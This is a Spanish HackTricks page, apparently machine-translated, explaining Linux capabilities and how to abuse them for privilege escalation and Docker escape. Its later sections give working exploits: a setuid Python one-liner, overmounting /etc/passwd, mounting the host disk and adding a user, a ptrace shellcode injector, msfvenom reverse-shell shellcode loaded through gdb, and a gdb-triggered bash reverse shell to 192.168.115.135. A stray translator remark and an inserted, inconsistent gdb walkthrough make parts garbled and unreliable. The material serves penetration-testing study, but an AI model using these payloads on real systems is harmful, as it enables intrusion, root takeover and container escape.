# Capacidades de Linux

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* Consigue el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) es el evento de ciberseguridad más relevante en **España** y uno de los más importantes en **Europa**. Con **la misión de promover el conocimiento técnico**, este congreso es un punto de encuentro para profesionales de la tecnología y la ciberseguridad en todas las disciplinas.\\

{% embed url="https://www.rootedcon.com/" %}

## ¿Por qué capacidades?

Las capacidades de Linux **proporcionan un subconjunto de los privilegios de root disponibles** a un proceso. Esto divide efectivamente los privilegios de root en unidades más pequeñas y distintivas. Cada una de estas unidades puede ser otorgada independientemente a los procesos. De esta manera, el conjunto completo de privilegios se reduce y se disminuyen los riesgos de explotación.

Para entender mejor cómo funcionan las capacidades de Linux, veamos primero el problema que intenta resolver.

Supongamos que estamos ejecutando un proceso como un usuario normal. Esto significa que no tenemos privilegios. Solo podemos acceder a datos que nos pertenecen, a nuestro grupo o que están marcados para el acceso de todos los usuarios. En algún momento, nuestro proceso necesita un poco más de permisos para cumplir con sus tareas, como abrir un socket de red. El problema es que los usuarios normales no pueden abrir un socket, ya que esto requiere permisos de root.

## Conjuntos de capacidades

**Capacidades heredadas**

**CapEff**: El conjunto de capacidades _efectivas_ representa todas las capacidades que el proceso está utilizando en ese momento (este es el conjunto real de capacidades que el kernel utiliza para las comprobaciones de permisos). Para las capacidades de archivo, el conjunto efectivo es en realidad un solo bit que indica si las capacidades del conjunto permitido se moverán al conjunto efectivo al ejecutar un binario. Esto hace posible que los binarios que no son conscientes de las capacidades utilicen las capacidades de archivo sin emitir llamadas de sistema especiales.

**CapPrm**: (_Permitido_) Este es un superset de capacidades que el hilo puede agregar a los conjuntos permitidos o heredables del hilo. El hilo puede usar la llamada al sistema capset() para administrar las capacidades: puede eliminar cualquier capacidad de cualquier conjunto, pero solo agregar capacidades a sus conjuntos efectivos e heredados de hilo que estén en su conjunto permitido de hilo. En consecuencia, no puede agregar ninguna capacidad a su conjunto permitido de hilo, a menos que tenga la capacidad cap\_setpcap en su conjunto efectivo de hilo.

**CapInh**: Usando el conjunto _heredado_ se pueden especificar todas las capacidades que se permiten heredar de un proceso padre. Esto evita que un proceso reciba capacidades que no necesita. Este conjunto se conserva a través de un `execve` y generalmente es establecido por un proceso que _recibe_ capacidades en lugar de por un proceso que otorga capacidades a sus hijos.

**CapBnd**: Con el conjunto _limitante_ es posible restringir las capacidades que un proceso puede recibir. Solo se permitirán las capacidades que estén presentes en el conjunto limitante en los conjuntos heredables y permitidos.

**CapAmb**: El conjunto de capacidades _ambientales_ se aplica a todos los binarios no SUID sin capacidades de archivo. Conserva las capacidades al llamar a `execve`. Sin embargo, no todas las capacidades del conjunto ambiental pueden ser conservadas porque se eliminan en caso de que no estén presentes en el conjunto de capacidades heredables o permitidas. Este conjunto se conserva a través de llamadas a `execve`.

Para una explicación detallada de la diferencia entre las capacidades en los hilos y los archivos y cómo se pasan las capacidades a los hilos, lea las siguientes páginas:

* [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
* [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)

## Capacidades de procesos y binarios

### Capacidades de procesos

Para ver las capacidades de un proceso en particular, use el archivo **status** en el directorio /proc. Como proporciona más detalles, limitemos la información solo a las capacidades de Linux.\
Tenga en cuenta que para toda la información de capacidades de los procesos en ejecución se mantiene por hilo, para los binarios en el sistema de archivos se almacena en atributos extendidos.

Puede encontrar las capacidades definidas en /usr/include/linux/capability.h

Puede encontrar las capacidades del proceso actual en `cat /proc/self/status` o haciendo `capsh --print` y de otros usuarios en `/proc/<pid>/status`
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
Este comando debería devolver 5 líneas en la mayoría de los sistemas.

* CapInh = Capacidades heredadas
* CapPrm = Capacidades permitidas
* CapEff = Capacidades efectivas
* CapBnd = Conjunto límite
* CapAmb = Conjunto de capacidades ambientales
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
Estos números hexadecimales no tienen sentido. Usando la utilidad capsh podemos decodificarlos en el nombre de las capacidades.
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
Veamos ahora las **capacidades** utilizadas por `ping`:
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Aunque eso funciona, hay otra manera más fácil. Para ver las capacidades de un proceso en ejecución, simplemente usa la herramienta **getpcaps** seguida de su ID de proceso (PID). También puedes proporcionar una lista de IDs de proceso.
```bash
getpcaps 1234
```
Veamos aquí las capacidades de `tcpdump` después de haberle otorgado suficientes capacidades (`cap_net_admin` y `cap_net_raw`) para capturar el tráfico de red (_tcpdump se está ejecutando en el proceso 9562_):
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Como se puede ver, las capacidades dadas corresponden con los resultados de las 2 formas de obtener las capacidades de un binario. La herramienta _getpcaps_ utiliza la llamada al sistema **capget()** para consultar las capacidades disponibles para un hilo en particular. Esta llamada al sistema solo necesita proporcionar el PID para obtener más información.

### Capacidades de Binarios

Los binarios pueden tener capacidades que se pueden utilizar durante la ejecución. Por ejemplo, es muy común encontrar el binario `ping` con la capacidad `cap_net_raw`:
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
Puedes **buscar binarios con capacidades** usando:
```bash
getcap -r / 2>/dev/null
```
### Eliminando capacidades con capsh

Si eliminamos las capacidades CAP\_NET\_RAW para _ping_, entonces la utilidad de ping ya no debería funcionar.
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
Además de la salida de _capsh_ en sí, el comando _tcpdump_ en sí mismo también debería generar un error.

> /bin/bash: /usr/sbin/tcpdump: Operación no permitida

El error muestra claramente que el comando ping no tiene permitido abrir un socket ICMP. Ahora sabemos con certeza que esto funciona como se espera.

### Eliminar capacidades

Puedes eliminar capacidades de un binario con
```bash
setcap -r </path/to/binary>
```
## Capacidades de usuario

Aparentemente **es posible asignar capacidades también a los usuarios**. Esto probablemente significa que cada proceso ejecutado por el usuario podrá utilizar las capacidades del usuario.\
Basándonos en [esto](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [esto](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html) y [esto](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user), algunos archivos nuevos deben ser configurados para dar a un usuario ciertas capacidades, pero el que asigna las capacidades a cada usuario será `/etc/security/capability.conf`.\
Ejemplo de archivo:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## Capacidades de Entorno

Compilando el siguiente programa es posible **generar una shell de bash dentro de un entorno que provee capacidades**.

{% code title="ambient.c" %}
```c
/*
 * Test program for the ambient capabilities
 *
 * compile using:
 * gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
 * Set effective, inherited and permitted capabilities to the compiled binary
 * sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
 *
 * To get a shell with additional caps that can be inherited do:
 *
 * ./ambient /bin/bash
 */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
  int rc;
  capng_get_caps_process();
  rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
  if (rc) {
    printf("Cannot add inheritable cap\n");
    exit(2);
  }
  capng_apply(CAPNG_SELECT_CAPS);
  /* Note the two 0s at the end. Kernel checks for these */
  if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
    perror("Cannot set cap");
    exit(1);
  }
}
void usage(const char * me) {
  printf("Usage: %s [-c caps] new-program new-args\n", me);
  exit(1);
}
int default_caplist[] = {
  CAP_NET_RAW,
  CAP_NET_ADMIN,
  CAP_SYS_NICE,
  -1
};
int * get_caplist(const char * arg) {
  int i = 1;
  int * list = NULL;
  char * dup = strdup(arg), * tok;
  for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
    list = realloc(list, (i + 1) * sizeof(int));
    if (!list) {
      perror("out of memory");
      exit(1);
    }
    list[i - 1] = atoi(tok);
    list[i] = -1;
    i++;
  }
  return list;
}
int main(int argc, char ** argv) {
  int rc, i, gotcaps = 0;
  int * caplist = NULL;
  int index = 1; // argv index for cmd to start
  if (argc < 2)
    usage(argv[0]);
  if (strcmp(argv[1], "-c") == 0) {
    if (argc <= 3) {
      usage(argv[0]);
    }
    caplist = get_caplist(argv[2]);
    index = 3;
  }
  if (!caplist) {
    caplist = (int * ) default_caplist;
  }
  for (i = 0; caplist[i] != -1; i++) {
    printf("adding %d to ambient list\n", caplist[i]);
    set_ambient_cap(caplist[i]);
  }
  printf("Ambient forking shell\n");
  if (execv(argv[index], argv + index))
    perror("Cannot exec");
  return 0;
}
```
{% endcode %} (This is a markdown tag, it should not be translated)
```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
Dentro del **bash ejecutado por el binario de ambiente compilado** es posible observar las **nuevas capacidades** (un usuario regular no tendrá ninguna capacidad en la sección "actual").
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
{% hint style="danger" %}
Solo puedes agregar capacidades que estén presentes tanto en los conjuntos permitidos como en los heredables.
{% endhint %}

### Binarios con capacidad habilitada / Binarios sin capacidad habilitada

Los **binarios con capacidad habilitada no utilizarán las nuevas capacidades** otorgadas por el entorno, sin embargo, los **binarios sin capacidad habilitada las utilizarán** ya que no las rechazarán. Esto hace que los binarios sin capacidad habilitada sean vulnerables dentro de un entorno especial que otorgue capacidades a los binarios.

## Capacidades de servicio

Por defecto, un **servicio que se ejecuta como root tendrá asignadas todas las capacidades**, y en algunas ocasiones esto puede ser peligroso.\
Por lo tanto, un archivo de **configuración del servicio permite especificar** las **capacidades** que deseas que tenga, **y** el **usuario** que debe ejecutar el servicio para evitar ejecutar un servicio con privilegios innecesarios:
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Capacidades en Contenedores Docker

Por defecto, Docker asigna algunas capacidades a los contenedores. Es muy fácil comprobar cuáles son estas capacidades ejecutando:
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
	BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) es el evento de ciberseguridad más relevante en **España** y uno de los más importantes en **Europa**. Con la misión de promover el conocimiento técnico, este congreso es un punto de encuentro para profesionales de la tecnología y la ciberseguridad en todas las disciplinas.

{% embed url="https://www.rootedcon.com/" %}

## Escalada de privilegios / Escape de contenedor

Las capacidades son útiles cuando se desea restringir los propios procesos después de realizar operaciones privilegiadas (por ejemplo, después de configurar chroot y enlazar a un socket). Sin embargo, pueden ser explotadas al pasarles comandos o argumentos maliciosos que luego se ejecutan como root.

Puede forzar capacidades en programas usando `setcap` y consultarlas usando `getcap`:
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
El símbolo `+ep` significa que estás añadiendo la capacidad (“-” la eliminaría) como Efectiva y Permitida.

Para identificar programas en un sistema o carpeta con capacidades:
```bash
getcap -r / 2>/dev/null
```
### Ejemplo de explotación

En el siguiente ejemplo se encuentra que el binario `/usr/bin/python2.6` es vulnerable a la escalada de privilegios:
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**Capacidades** necesarias por `tcpdump` para **permitir a cualquier usuario capturar paquetes**:

Para permitir que cualquier usuario capture paquetes con `tcpdump`, se deben asignar las capacidades de `CAP_NET_RAW` y `CAP_NET_ADMIN` al binario `tcpdump`. Esto se puede hacer con el siguiente comando:

```
sudo setcap 'CAP_NET_RAW+eip CAP_NET_ADMIN+eip' /usr/sbin/tcpdump
```

Esto permitirá que cualquier usuario ejecute `tcpdump` y capture paquetes sin necesidad de privilegios de root.
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### El caso especial de las capacidades "vacías"

Tenga en cuenta que se pueden asignar conjuntos de capacidades vacíos a un archivo de programa, por lo que es posible crear un programa set-user-ID-root que cambie el ID de usuario efectivo y guardado del proceso que ejecuta el programa a 0, pero no confiere capacidades a ese proceso. O, dicho de manera simple, si tiene un binario que:

1. no es propiedad de root
2. no tiene bits `SUID`/`SGID` establecidos
3. tiene un conjunto de capacidades vacío (por ejemplo: `getcap myelf` devuelve `myelf =ep`)

entonces **ese binario se ejecutará como root**.

## CAP\_SYS\_ADMIN

[**CAP\_SYS\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) es en gran medida una capacidad general, que puede llevar fácilmente a capacidades adicionales o a root completo (por lo general, acceso a todas las capacidades). `CAP_SYS_ADMIN` es necesario para realizar una serie de **operaciones administrativas**, lo que es difícil de eliminar de los contenedores si se realizan operaciones privilegiadas dentro del contenedor. A menudo, es necesario conservar esta capacidad para contenedores que imitan sistemas completos en lugar de contenedores de aplicaciones individuales que pueden ser más restrictivos. Entre otras cosas, esto permite **montar dispositivos** o abusar de **release\_agent** para escapar del contenedor.

**Ejemplo con binario**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
Usando Python puedes montar un archivo _passwd_ modificado encima del archivo _passwd_ real:
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
Y finalmente **montar** el archivo `passwd` modificado en `/etc/passwd`:
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
Y podrás **`su` como root** usando la contraseña "password".

**Ejemplo con entorno (Docker breakout)**

Puedes verificar las capacidades habilitadas dentro del contenedor de Docker usando:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Dentro de la salida anterior se puede ver que la capacidad SYS\_ADMIN está habilitada.

* **Montaje**

Esto permite al contenedor de docker **montar el disco del host y acceder a él libremente**:
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
* **Acceso completo**

En el método anterior logramos acceder al disco del host de Docker.\
En caso de que encuentres que el host está ejecutando un servidor **ssh**, podrías **crear un usuario dentro del disco del host de Docker** y acceder a él a través de SSH:
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP\_SYS\_PTRACE

**Esto significa que puedes escapar del contenedor inyectando un shellcode dentro de algún proceso que se esté ejecutando dentro del host.** Para acceder a los procesos que se ejecutan dentro del host, el contenedor debe ejecutarse al menos con **`--pid=host`**.

[**CAP\_SYS\_PTRACE**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permite el uso de `ptrace(2)` y llamadas al sistema recientemente introducidas como `process_vm_readv(2)` y `process_vm_writev(2)` para adjuntar memoria cruzada. Si se concede esta capacidad y la llamada al sistema `ptrace(2)` en sí no está bloqueada por un filtro seccomp, esto permitirá a un atacante evitar otras restricciones seccomp, ver [PoC para evitar seccomp si se permite ptrace](https://gist.github.com/thejh/8346f47e359adecd1d53) o el **siguiente PoC**:

**Ejemplo con binario (python)**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
    _fields_ = [
        ("r15", ctypes.c_ulonglong),
        ("r14", ctypes.c_ulonglong),
        ("r13", ctypes.c_ulonglong),
        ("r12", ctypes.c_ulonglong),
        ("rbp", ctypes.c_ulonglong),
        ("rbx", ctypes.c_ulonglong),
        ("r11", ctypes.c_ulonglong),
        ("r10", ctypes.c_ulonglong),
        ("r9", ctypes.c_ulonglong),
        ("r8", ctypes.c_ulonglong),
        ("rax", ctypes.c_ulonglong),
        ("rcx", ctypes.c_ulonglong),
        ("rdx", ctypes.c_ulonglong),
        ("rsi", ctypes.c_ulonglong),
        ("rdi", ctypes.c_ulonglong),
        ("orig_rax", ctypes.c_ulonglong),
        ("rip", ctypes.c_ulonglong),
        ("cs", ctypes.c_ulonglong),
        ("eflags", ctypes.c_ulonglong),
        ("rsp", ctypes.c_ulonglong),
        ("ss", ctypes.c_ulonglong),
        ("fs_base", ctypes.c_ulonglong),
        ("gs_base", ctypes.c_ulonglong),
        ("ds", ctypes.c_ulonglong),
        ("es", ctypes.c_ulonglong),
        ("fs", ctypes.c_ulonglong),
        ("gs", ctypes.c_ulonglong),
    ]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
    # Convert the byte to little endian.
    shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
    shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
    shellcode_byte=int(shellcode_byte_little_endian,16)

    # Inject the byte.
    libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**Ejemplo con binario (gdb)**

`gdb` con capacidad de `ptrace`:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
# Crear un shellcode con msfvenom para inyectar en memoria a través de gdb

Para crear un shellcode con msfvenom, primero debemos especificar la plataforma de destino y la arquitectura. En este ejemplo, utilizaremos una plataforma Linux x86_64:

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f c -o shellcode.c
```

Esto generará un shellcode en lenguaje C que podemos compilar y ejecutar en una máquina de destino. Para inyectar este shellcode en memoria a través de gdb, podemos seguir los siguientes pasos:

1. Compilar el shellcode generado con msfvenom:

```
gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
```

2. Ejecutar gdb y cargar el programa de destino:

```
gdb <programa>
```

3. Establecer un punto de interrupción en una función que permita la ejecución de código arbitrario, como `system` o `execve`:

```
break system
```

4. Ejecutar el programa hasta que se alcance el punto de interrupción:

```
run
```

5. En otro terminal, ejecutar el siguiente comando para obtener el PID del proceso:

```
ps aux | grep <programa>
```

6. Volver a gdb y adjuntar el proceso:

```
attach <PID>
```

7. Establecer el valor del registro de instrucción (`rip`) en la dirección de inicio del shellcode:

```
set $rip=<dirección>
```

8. Ejecutar el shellcode:

```
continue
```

El shellcode generado con msfvenom ahora se ejecutará en memoria y podemos utilizarlo para realizar acciones maliciosas en la máquina de destino.
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (8 - len(buf) % 8 ) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
	chunk = payload[i:i+8][::-1]
	chunks = "0x"
	for byte in chunk:
		chunks += f"{byte:02x}"

	print(f"set {{long}}($rip+{i}) = {chunks}")
```
Depurar un proceso root con gdb y copiar-pegar las líneas de gdb generadas previamente:

```
# Attach to the process
$ gdb -p <pid>

# Enable debugging symbols
(gdb) symbol-file /usr/lib/debug/.build-id/<debug-id>.debug

# Set the breakpoint
(gdb) break main

# Continue execution
(gdb) continue

# Once the breakpoint is hit, set the uid/gid to 0
(gdb) call setresuid(0, 0, 0)
(gdb) call setresgid(0, 0, 0)

# Continue execution until the vulnerability is triggered
(gdb) continue
```
```bash
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) set {long}($rip+0) = 0x296a909090909090
(gdb) set {long}($rip+8) = 0x5e016a5f026a9958
(gdb) set {long}($rip+16) = 0x0002b9489748050f
(gdb) set {long}($rip+24) = 0x48510b0e0a0a2923
(gdb) set {long}($rip+32) = 0x582a6a5a106ae689
(gdb) set {long}($rip+40) = 0xceff485e036a050f
(gdb) set {long}($rip+48) = 0x6af675050f58216a
(gdb) set {long}($rip+56) = 0x69622fbb4899583b
(gdb) set {long}($rip+64) = 0x8948530068732f6e
(gdb) set {long}($rip+72) = 0x050fe689485752e7
(gdb) c
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**Ejemplo con entorno (Docker breakout) - Otro abuso de gdb**

Si **GDB** está instalado (o puedes instalarlo con `apk add gdb` o `apt install gdb`, por ejemplo), puedes **depurar un proceso desde el host** y hacer que llame a la función `system`. (Esta técnica también requiere la capacidad `SYS_ADMIN`).
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
